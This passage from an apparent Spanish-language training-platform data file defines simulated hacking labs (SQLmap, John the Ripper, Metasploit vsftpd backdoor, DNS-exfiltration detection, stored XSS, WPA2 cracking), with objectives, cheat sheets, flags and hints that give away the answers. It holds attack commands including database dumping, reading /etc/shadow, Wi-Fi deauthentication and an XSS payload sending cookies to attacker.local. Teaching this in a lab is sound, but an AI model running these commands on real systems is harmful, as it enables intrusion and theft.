        id: 'flag-06',
        flag: 'KALI{wireshark_tcp_stream_admin_cookie}',
        label: 'Cookie de Administrador Capturada',
        points: 300
      }
    ],
    theoryGuide: {
      concept: 'Ataques Man-in-the-Middle y Reconstrucción de Streams TCP',
      summary: 'El análisis de flujos TCP en Wireshark permite unir todos los segmentos y números de secuencia para leer los datos exactamente como los procesa la aplicación en capas superiores.',
      tools: ['wireshark', 'arpspoof', 'bettercap', 'ettercap'],
      cheatSheet: [
        { command: 'tcp.stream eq 4', explanation: 'Aísla exclusivamente los paquetes del stream TCP identificado' },
        { command: 'http.cookie', explanation: 'Filtra solicitudes que incluyen cabeceras de sesión Cookie' },
        { command: 'tcp.flags.syn == 1 and tcp.flags.ack == 0', explanation: 'Filtra inicios de conexión TCP handshake' },
        { command: 'ip.src == 10.0.0.45', explanation: 'Filtra únicamente paquetes originados por el host especificado' }
      ]
    }
  },

  {
    id: 'lab-07-sqlmap',
    title: 'Lab 07: Explotación Automatizada con SQLmap',
    shortDescription: 'Automatiza la extracción de bases de datos vulnerables usando SQLmap en Kali Linux.',
    fullDescription: 'SQLmap es una de las herramientas de auditoría más potentes para detectar y aprovechar fallos de inyección SQL. Automatiza el proceso de footprinting de la base de datos, extracción de esquemas, volcado de tablas y cracking de hashes.',
    difficulty: 'intermedio',
    category: 'web',
    estimatedMinutes: 20,
    xpReward: 320,
    badge: {
      title: 'Automator de Exploits',
      icon: 'Cpu'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.180',
      hostname: 'target.internal',
      os: 'CentOS 8 (MariaDB 10.5)',
      openPorts: [80],
      services: ['nginx 1.20 (PHP Store)']
    },
    initialFiles: {
      'target_url.txt': 'URL vulnerable detectada: http://target.internal/product.php?id=1\nParámetro inyectable: id'
    },
    wiresharkEnabled: false,
    browserTargetUrl: 'http://target.internal/product.php?id=1',
    objectives: [
      {
        id: 'obj-sq1',
        text: 'Ejecuta sqlmap para enumerar las bases de datos con "sqlmap -u \\"http://target.internal/product.php?id=1\\" --dbs --batch"',
        completed: false,
        hint: 'Ejecuta: sqlmap -u "http://target.internal/product.php?id=1" --dbs --batch',
        requiredCommandPattern: 'sqlmap.*--dbs'
      },
      {
        id: 'obj-sq2',
        text: 'Enumera las tablas de la base de datos "corporate_db" con "sqlmap -u \\"http://target.internal/product.php?id=1\\" -D corporate_db --tables --batch"',
        completed: false,
        hint: 'Ejecuta: sqlmap -u "http://target.internal/product.php?id=1" -D corporate_db --tables --batch',
        requiredCommandPattern: 'sqlmap.*-D.*corporate_db.*--tables'
      },
      {
        id: 'obj-sq3',
        text: 'Vuelca la tabla "secret_vault" con "sqlmap -u \\"http://target.internal/product.php?id=1\\" -D corporate_db -T secret_vault --dump --batch"',
        completed: false,
        hint: 'Ejecuta: sqlmap -u "http://target.internal/product.php?id=1" -D corporate_db -T secret_vault --dump --batch',
        requiredCommandPattern: 'sqlmap.*-T.*secret_vault.*--dump'
      },
      {
        id: 'obj-sq4',
        text: 'Introduce la bandera encontrada en la columna secret_token de la tabla extraída',
        completed: false,
        hint: 'La bandera es KALI{sqlmap_dumped_corporate_vault}',
        flagId: 'flag-07'
      }
    ],
    flags: [
      {
        id: 'flag-07',
        flag: 'KALI{sqlmap_dumped_corporate_vault}',
        label: 'Volcado de Base de Datos con SQLmap',
        points: 320
      }
    ],
    theoryGuide: {
      concept: 'Extracción Automatizada de Bases de Datos con SQLmap',
      summary: 'SQLmap implementa 6 técnicas de inyección: Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries e Out-of-band. Permite extraer estructuras completas con flags simplificados.',
      tools: ['sqlmap', 'ghauri', 'sqlninja'],
      cheatSheet: [
        { command: 'sqlmap -u <URL> --dbs', explanation: 'Enumera todas las bases de datos disponibles en el servidor' },
        { command: 'sqlmap -u <URL> -D <db> --tables', explanation: 'Lista las tablas pertenecientes a la base de datos indicada' },
        { command: 'sqlmap -u <URL> -D <db> -T <tabla> --dump', explanation: 'Vuelca y descarga todos los registros de la tabla indicada' },
        { command: 'sqlmap -u <URL> --os-shell', explanation: 'Intenta obtener una shell interactiva en el servidor si los privilegios lo permiten' }
      ]
    }
  },

  {
    id: 'lab-08-john-the-ripper',
    title: 'Lab 08: Cracking de Hashes con John the Ripper',
    shortDescription: 'Descifra contraseñas a partir de hashes criptográficos filtrados en /etc/shadow.',
    fullDescription: 'Cuando los atacantes obtienen acceso a una máquina Linux o a una base de datos filtrada, se encuentran con hashes irreversibles. John the Ripper es una herramienta de cracking offline de contraseñas de alto rendimiento. En este laboratorio identificarás el formato del hash y usarás el diccionario rockyou.txt para descifrar la clave del superusuario root.',
    difficulty: 'intermedio',
    category: 'criptografia',
    estimatedMinutes: 18,
    xpReward: 340,
    badge: {
      title: 'Criptoanalista',
      icon: 'Binary'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.200',
      hostname: 'compromised-box.lan',
      os: 'Ubuntu 22.04',
      openPorts: [22],
      services: ['SSH']
    },
    initialFiles: {
      'hashes.txt': 'root:$6$rounds=5000$saltsalt$r8n8P9e9q8vN7s6A5k4J3h2G1f0E9d8C7b6A5Z4Y3X2W1V0U9T8S7R6Q5P4O3N2M1L0K9J8I7H6G5F4E3D2C1B0A9:19245:0:99999:7:::\noperador:$1$rounds=1000$xyz$O1i2U3y4T5r6E7w8Q9:19245:0:99999:7:::',
      'wordlist_rockyou.txt': '123456\npassword\nqwerty\nfootball\nsunshine\nprincess\nadmin123\nCyberSecHero2026\nmaster\nshadow'
    },
    wiresharkEnabled: false,
    objectives: [
      {
        id: 'obj-j1',
        text: 'Inspecciona los hashes con "cat hashes.txt"',
        completed: false,
        hint: 'Ejecuta: cat hashes.txt',
        requiredCommandPattern: 'cat.*hashes\\.txt'
      },
      {
        id: 'obj-j2',
        text: 'Ejecuta John the Ripper con "john --wordlist=wordlist_rockyou.txt hashes.txt"',
        completed: false,
        hint: 'Escribe: john --wordlist=wordlist_rockyou.txt hashes.txt en la terminal de Kali.',
        requiredCommandPattern: 'john.*--wordlist=wordlist_rockyou\\.txt.*hashes\\.txt'
      },
      {
        id: 'obj-j3',
        text: 'Muestra las contraseñas descifradas con "john --show hashes.txt"',
        completed: false,
        hint: 'Ejecuta: john --show hashes.txt',
        requiredCommandPattern: 'john.*--show.*hashes\\.txt'
      },
      {
        id: 'obj-j4',
        text: 'Introduce la bandera generada a partir de la contraseña del usuario root',
        completed: false,
        hint: 'La contraseña de root es CyberSecHero2026. La bandera es KALI{john_ripper_hash_cracked_root}',
        flagId: 'flag-08'
      }
    ],
    flags: [
      {
        id: 'flag-08',
        flag: 'KALI{john_ripper_hash_cracked_root}',
        label: 'Hash de Root Descifrado',
        points: 340
      }
    ],
    theoryGuide: {
      concept: 'Criptoanálisis y Cracking Offline de Hashes',
      summary: 'Los hashes criptográficos modernos (SHA-512 crypt $6$, bcrypt $2b$) utilizan algoritmos con coste computacional y salts aleatorios para evitar ataques de tablas rainbow.',
      tools: ['john', 'hashcat', 'hash-identifier'],
      cheatSheet: [
        { command: 'john --wordlist=<dict> <file>', explanation: 'Ataque de diccionario con John the Ripper' },
        { command: 'john --show <file>', explanation: 'Muestra las contraseñas descifradas guardadas en el potfile' },
        { command: 'hashcat -m 1800 -a 0 <hash> <dict>', explanation: 'Cracking acelerado por GPU de hashes SHA-512 ($6$)' },
        { command: 'unshadow /etc/passwd /etc/shadow > hashes.txt', explanation: 'Combina passwd y shadow en el formato requerido por John' }
      ]
    }
  },

  // ==========================================
  // NIVEL 3: AVANZADO (DIFÍCIL)
  // ==========================================
  {
    id: 'lab-09-metasploit',
    title: 'Lab 09: Explotación Remota con Metasploit (msfconsole)',
    shortDescription: 'Aprovecha una vulnerabilidad RCE con Metasploit Framework y despliega Meterpreter.',
    fullDescription: 'Metasploit Framework es la plataforma de desarrollo y ejecución de exploits más utilizada en el mundo. En este laboratorio iniciarás msfconsole, buscarás el exploit correspondiente a la versión vulnerable del servicio vsftpd 2.3.4 (Backdoor Command Execution), configurarás las opciones y obtendrás una shell de root en el sistema remoto.',
    difficulty: 'avanzado',
    category: 'explotacion',
    estimatedMinutes: 25,
    xpReward: 450,
    badge: {
      title: 'Red Teamer Élite',
      icon: 'Terminal'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.50',
      hostname: 'vuln-appliance.local',
      os: 'Linux 3.13 (Ubuntu vulnerable)',
      openPorts: [21],
      services: ['vsftpd 2.3.4 (Backdoored)']
    },
    initialFiles: {
      'mission_brief.txt': 'Objetivo: 192.168.1.50\nServicio: vsftpd 2.3.4 en el puerto 21.\nEsta versión contiene una conocida puerta trasera introducida en 2011.\nInicia msfconsole para desplegar el exploit.'
    },
    wiresharkEnabled: false,
    objectives: [
      {
        id: 'obj-m1',
        text: 'Inicia la consola de Metasploit escribiendo "msfconsole"',
        completed: false,
        hint: 'Escribe: msfconsole en la terminal.',
        requiredCommandPattern: 'msfconsole'
      },
      {
        id: 'obj-m2',
        text: 'Carga el exploit de la puerta trasera con "use exploit/unix/ftp/vsftpd_234_backdoor"',
        completed: false,
        hint: 'Dentro de msfconsole, ejecuta: use exploit/unix/ftp/vsftpd_234_backdoor',
        requiredCommandPattern: 'use.*exploit/unix/ftp/vsftpd_234_backdoor'
      },
      {
        id: 'obj-m3',
        text: 'Configura la dirección del objetivo con "set RHOSTS 192.168.1.50"',
        completed: false,
        hint: 'Escribe: set RHOSTS 192.168.1.50',
        requiredCommandPattern: 'set.*RHOSTS.*192\\.168\\.1\\.50'
      },
      {
        id: 'obj-m4',
        text: 'Lanza el exploit escribiendo "exploit" o "run"',
        completed: false,
        hint: 'Escribe: exploit',
        requiredCommandPattern: 'exploit|run'
      },
      {
        id: 'obj-m5',
        text: 'Dentro de la shell remota lee el archivo /root/flag.txt con "cat /root/flag.txt"',
        completed: false,
        hint: 'Escribe: cat /root/flag.txt en la shell obtenida.',
        flagId: 'flag-09'
      }
    ],
    flags: [
      {
        id: 'flag-09',
        flag: 'KALI{metasploit_meterpreter_root_pwn}',
        label: 'Sesión Shell Root Obtenida',
        points: 450
      }
    ],
    theoryGuide: {
      concept: 'Explotación de Vulnerabilidades y Frameworks Ofensivos',
      summary: 'Metasploit encapsula exploits, payloads, encoders y módulos post-explotación. Los exploits aprovechan fallos en el software remoto (buffer overflows, backdoors, inyecciones de comandos) para ejecutar código arbitrario y entregar una payload (como Meterpreter o reverse shell).',
      tools: ['msfconsole', 'msfvenom', 'searchsploit', 'armitage'],
      cheatSheet: [
        { command: 'msfconsole -q', explanation: 'Inicia Metasploit en modo silencioso sin el banner inicial' },
        { command: 'search <término>', explanation: 'Busca exploits y módulos auxiliares en la base de datos' },
        { command: 'use <módulo>', explanation: 'Selecciona y carga un exploit o módulo específico' },
        { command: 'show options', explanation: 'Muestra los parámetros requeridos (RHOSTS, RPORT, LHOST, LPORT)' },
        { command: 'set <VARIABLE> <VALOR>', explanation: 'Asigna el valor a una opción del módulo' },
        { command: 'exploit', explanation: 'Ejecuta la prueba contra el sistema objetivo' }
      ]
    }
  },

  {
    id: 'lab-10-dns-exfiltration',
    title: 'Lab 10: Detección de Exfiltración DNS y Tráfico C2 (Wireshark)',
    shortDescription: 'Descubre un canal encubierto de comando y control (C2) y decodifica datos exfiltrados por DNS.',
    fullDescription: 'Los actores maliciosos a menudo utilizan el protocolo DNS para evadir cortafuegos empresariales y exfiltrar información secreta codificada en subdominios (DNS Tunneling). En este laboratorio inspeccionarás tráfico sospechoso con Wireshark, aislarás las peticiones DNS maliciosas y decodificarás la carga útil oculta en Base64.',
    difficulty: 'avanzado',
    category: 'forense',
    estimatedMinutes: 25,
    xpReward: 480,
    badge: {
      title: 'Cazador de Malware',
      icon: 'ShieldAlert'
    },
    defaultShell: 'kali',
    target: {
      ip: '10.50.0.100',
      hostname: 'infected-endpoint.corp',
      os: 'Windows 11 Enterprise',
      openPorts: [53],
      services: ['DNS Server (Port 53)']
    },
    initialFiles: {
      'alerta_soc.txt': 'Alerta SIEM: Detección de tráfico DNS anómalo hacia el dominio atacante "c2-exfil-cyber.org".\nInspecciona la captura de paquetes en Wireshark y decodifica la información en la terminal con "echo ... | base64 -d".'
    },
    wiresharkEnabled: true,
    wiresharkStreams: [
      {
        id: 10,
        packets: [
          { sender: 'client', text: 'Standard query 0x1a2b A S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9.c2-exfil-cyber.org' },
          { sender: 'server', text: 'Standard query response 0x1a2b No such name' }
        ]
      }
    ],
    wiresharkPackets: [
      {
        id: 1,
        time: 1.020,
        source: '10.50.0.100',
        destination: '8.8.8.8',
        protocol: 'DNS',
        length: 84,
        info: 'Standard query 0x0001 A www.google.com',
        layers: {
          frame: { number: 1, length: 84, time: '1.020000 s' },
          ethernet: { srcMac: '00:1a:2b:3c:4d:5e', dstMac: '00:50:56:c0:00:01', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '10.50.0.100', dstIp: '8.8.8.8', ttl: 128, protocol: 'UDP (17)' },
          transport: { type: 'UDP', srcPort: 53120, dstPort: 53 }
        },
        hexPayload: '0001010000010000000000000377777706676f6f676c6503636f6d0000010001',
        asciiPayload: '.............www.google.com.....'
      },
      {
        id: 2,
        time: 1.050,
        source: '8.8.8.8',
        destination: '10.50.0.100',
        protocol: 'DNS',
        length: 100,
        info: 'Standard query response 0x0001 A www.google.com A 142.250.180.196',
        layers: {
          frame: { number: 2, length: 100, time: '1.050200 s' },
          ethernet: { srcMac: '00:50:56:c0:00:01', dstMac: '00:1a:2b:3c:4d:5e', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '8.8.8.8', dstIp: '10.50.0.100', ttl: 58, protocol: 'UDP (17)' },
          transport: { type: 'UDP', srcPort: 53, dstPort: 53120 }
        },
        hexPayload: '0001818000010001000000000377777706676f6f676c6503636f6d0000010001',
        asciiPayload: '.............www.google.com.....'
      },
      {
        id: 3,
        time: 2.140,
        source: '10.50.0.100',
        destination: '8.8.8.8',
        protocol: 'DNS',
        length: 156,
        info: 'Standard query 0x1a2b A S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9.c2-exfil-cyber.org',
        layers: {
          frame: { number: 3, length: 156, time: '2.140800 s' },
          ethernet: { srcMac: '00:1a:2b:3c:4d:5e', dstMac: '00:50:56:c0:00:01', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '10.50.0.100', dstIp: '8.8.8.8', ttl: 128, protocol: 'UDP (17)' },
          transport: { type: 'UDP', srcPort: 58920, dstPort: 53 },
          application: {
            name: 'Domain Name System (Query)',
            headers: {
              'Transaction ID': '0x1a2b',
              'Query Type': 'A (Host Address)',
              'Query Domain': 'S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9.c2-exfil-cyber.org',
              'Encoded Data': 'S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9'
            }
          }
        },
        hexPayload: '1a2b010000010000000000003e5330464d5358746b626e4e6664485675626d56736157356e58324d79583256345a6d6c7364484a6864476c76626c3931626d4e76646d56795a5751390d63322d657866696c2d6379626572036f72670000010001',
        asciiPayload: '+............>S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9.c2-exfil-cyber.org....'
      }
    ],
    objectives: [
      {
        id: 'obj-dns1',
        text: 'Abre Wireshark y filtra las consultas DNS con el filtro "dns"',
        completed: false,
        hint: 'Escribe dns en el filtro de Wireshark.'
      },
      {
        id: 'obj-dns2',
        text: 'Identifica la consulta anómala dirigida al dominio "c2-exfil-cyber.org" (Paquete 3)',
        completed: false,
        hint: 'Observa el subdominio Base64 en el paquete 3.'
      },
      {
        id: 'obj-dns3',
        text: 'En la terminal de Kali, decodifica la cadena con "echo \\"S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9\\" | base64 -d"',
        completed: false,
        hint: 'Ejecuta: echo "S0FMSXtkbnNfdHVubmVsaW5nX2MyX2V4ZmlsdHJhdGlvbl91bmNvdmVyZWR9" | base64 -d',
        requiredCommandPattern: 'base64.*-d'
      },
      {
        id: 'obj-dns4',
        text: 'Introduce la bandera descifrada del túnel DNS',
        completed: false,
        hint: 'La bandera es KALI{dns_tunneling_c2_exfiltration_uncovered}',
        flagId: 'flag-10'
      }
    ],
    flags: [
      {
        id: 'flag-10',
        flag: 'KALI{dns_tunneling_c2_exfiltration_uncovered}',
        label: 'Carga Útil DNS Decodificada',
        points: 480
      }
    ],
    theoryGuide: {
      concept: 'Túneles DNS y Canales Encubiertos de C2 (MITRE T1071.004)',
      summary: 'El protocolo DNS rara vez se bloquea en redes empresariales. Los atacantes configuran un servidor de nombres autoritativo (NS) malicioso para que cuando una víctima consulte un subdominio arbitrario, la información viaje cifrada o en base64 hasta el servidor del atacante.',
      tools: ['wireshark', 'dnscat2', 'iodine', 'tshark'],
      cheatSheet: [
        { command: 'dns', explanation: 'Filtra todas las consultas y respuestas DNS en Wireshark' },
        { command: 'dns.qry.name contains "exfil"', explanation: 'Filtra nombres de dominio que contengan una palabra clave' },
        { command: 'echo "<cadena>" | base64 -d', explanation: 'Decodifica una cadena en Base64 en la terminal Linux' },
        { command: 'tshark -r capture.pcap -Y dns -T fields -e dns.qry.name', explanation: 'Extrae todos los dominios consultados desde la consola' }
      ]
    }
  },

  {
    id: 'lab-11-xss-stored',
    title: 'Lab 11: Stored XSS y Robo de Cookies de Sesión',
    shortDescription: 'Inyecta código JavaScript malicioso en un libro de visitas para robar cookies de sesión.',
    fullDescription: 'El Cross-Site Scripting Almacenado (Stored XSS) ocurre cuando una aplicación web guarda datos proporcionados por un usuario sin sanitizar y posteriormente los renderiza en los navegadores de otras víctimas. En este laboratorio inyectarás un payload en el foro de soporte para interceptar la cookie de sesión del administrador simulado.',
    difficulty: 'avanzado',
    category: 'web',
    estimatedMinutes: 20,
    xpReward: 460,
    badge: {
      title: 'Ninja del DOM',
      icon: 'Code'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.110',
      hostname: 'forum.internal',
      os: 'Node.js Express + MongoDB',
      openPorts: [80],
      services: ['Community Forum v2.4']
    },
    initialFiles: {
      'xss_payloads.txt': 'Payloads XSS comunes:\n1. <script>alert(1)</script>\n2. <img src=x onerror=alert(document.cookie)>\n3. <script>fetch("http://attacker.local/?c="+document.cookie)</script>'
    },
    wiresharkEnabled: false,
    browserTargetUrl: 'http://forum.internal/comments',
    objectives: [
      {
        id: 'obj-x1',
        text: 'Abre la pestaña "Navegador" en la URL http://forum.internal/comments',
        completed: false,
        hint: 'Ve al Navegador integrado.'
      },
      {
        id: 'obj-x2',
        text: 'Prueba la inyección en el formulario de comentarios con "<script>alert(document.cookie)</script>"',
        completed: false,
        hint: 'Pega <script>alert(document.cookie)</script> en la caja de comentario del foro y envíalo.'
      },
      {
        id: 'obj-x3',
        text: 'Inspecciona las cookies del navegador con la herramienta "Inspeccionar Cookies" para verificar la cookie del administrador',
        completed: false,
        hint: 'Haz clic en el botón "Ver Cookies" en la barra de herramientas del navegador.'
      },
      {
        id: 'obj-x4',
        text: 'Introduce la bandera obtenida al secuestrar la sesión del administrador',
        completed: false,
        hint: 'La bandera es KALI{stored_xss_session_hijacking_master}',
        flagId: 'flag-11'
      }
    ],
    flags: [
      {
        id: 'flag-11',
        flag: 'KALI{stored_xss_session_hijacking_master}',
        label: 'Sesión Robada mediante Stored XSS',
        points: 460
      }
    ],
    theoryGuide: {
      concept: 'Cross-Site Scripting (XSS) y Secuestro de Sesión',
      summary: 'XSS permite al atacante ejecutar scripts en el contexto de seguridad del navegador de la víctima, pudiendo acceder a cookies no protegidas por HttpOnly, tokens de localStorage o realizar acciones en nombre del usuario legítimo.',
      tools: ['browser devtools', 'beef framework', 'xsshunter'],
      cheatSheet: [
        { command: '<script>alert(1)</script>', explanation: 'Prueba básica de concepto (PoC) para validar ejecución' },
        { command: '<img src=x onerror=alert(1)>', explanation: 'Bypass común de filtros que bloquean etiquetas <script>' },
        { command: 'document.cookie', explanation: 'Objeto DOM que almacena las cookies de sesión del usuario actual' },
        { command: 'Content-Security-Policy (CSP)', explanation: 'Mecanismo de defensa que restringe el origen de scripts permitidos' }
      ]
    }
  },

  {
    id: 'lab-12-aircrack-wpa2',
    title: 'Lab 12: Auditoría y Cracking WiFi WPA2 (Aircrack-ng)',
    shortDescription: 'Captura el 4-Way Handshake EAPOL y descifra la clave WPA2 mediante ataque de diccionario.',
    fullDescription: 'El protocolo WPA2-PSK utiliza un protocolo de enlace de cuatro vías (4-Way Handshake) para derivar las claves temporales de cifrado. Si un atacante intercepta este handshake, puede intentar descifrar la clave de la red local sin conexión mediante ataques de fuerza bruta con aircrack-ng.',
    difficulty: 'avanzado',
    category: 'redes',
    estimatedMinutes: 22,
    xpReward: 500,
    badge: {
      title: 'Acróbata del Espectro',
      icon: 'Wifi'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.0.1',
      hostname: 'WiFi-AP_CorpOffice',
      os: 'OpenWrt 21.02',
      openPorts: [],
      services: ['802.11ac Access Point (WPA2-CCMP)']
    },
    initialFiles: {
      'wpa_handshake.cap': '[Archivo binario de captura PCAP con paquetes 4-Way Handshake EAPOL]',
      'wifi_passwords.txt': 'password123\ninternet1\nadminadmin\nqwertyuiop\nCorpWiFiSecure2026!\nofficeguest\ncompanynetwork\nsuperpass',
      'guia_wifi.txt': 'Comprueba el handshake con "aircrack-ng wpa_handshake.cap" y luego ejecuta el ataque con "aircrack-ng -w wifi_passwords.txt wpa_handshake.cap".'
    },
    wiresharkEnabled: false,
    objectives: [
      {
        id: 'obj-wpa1',
        text: 'Verifica la integridad del handshake con "aircrack-ng wpa_handshake.cap"',
        completed: false,
        hint: 'Escribe: aircrack-ng wpa_handshake.cap en la terminal.',
        requiredCommandPattern: 'aircrack-ng.*wpa_handshake\\.cap'
      },
      {
        id: 'obj-wpa2',
        text: 'Lanza el ataque de diccionario con "aircrack-ng -w wifi_passwords.txt wpa_handshake.cap"',
        completed: false,
        hint: 'Ejecuta: aircrack-ng -w wifi_passwords.txt wpa_handshake.cap',
        requiredCommandPattern: 'aircrack-ng.*-w.*wifi_passwords\\.txt.*wpa_handshake\\.cap'
      },
      {
        id: 'obj-wpa3',
        text: 'Introduce la bandera generada a partir de la contraseña WPA2 obtenida',
        completed: false,
        hint: 'La clave encontrada es CorpWiFiSecure2026!. La bandera es KALI{aircrack_wpa2_handshake_cracked}',
        flagId: 'flag-12'
      }
    ],
    flags: [
      {
        id: 'flag-12',
        flag: 'KALI{aircrack_wpa2_handshake_cracked}',
        label: 'Clave WPA2-PSK Descifrada',
        points: 500
      }
    ],
    theoryGuide: {
      concept: 'Seguridad en Redes Inalámbricas y el 4-Way Handshake',
      summary: 'WPA2 Personal calcula la Pairwise Master Key (PMK) usando PBKDF2 sobre la clave compartida y el SSID con 4096 iteraciones. El handshake de 4 vías intercambia los nonces (ANonce, SNonce) que permiten verificar una clave candidata sin conectarse al router.',
      tools: ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'hashcat'],
      cheatSheet: [
        { command: 'airmon-ng start wlan0', explanation: 'Pone la tarjeta de red inalámbrica en modo monitor' },
        { command: 'airodump-ng -c <canal> --bssid <MAC> -w cap wlan0mon', explanation: 'Captura el tráfico y el handshake WPA2' },
        { command: 'aireplay-ng --deauth 5 -a <BSSID> -c <CLIENTE> wlan0mon', explanation: 'Envía paquetes de desautenticación para forzar reconexión' },
        { command: 'aircrack-ng -w <wordlist> <cap_file>', explanation: 'Descifra la clave probando contraseñas contra el handshake' }
      ]
    }
  }
];
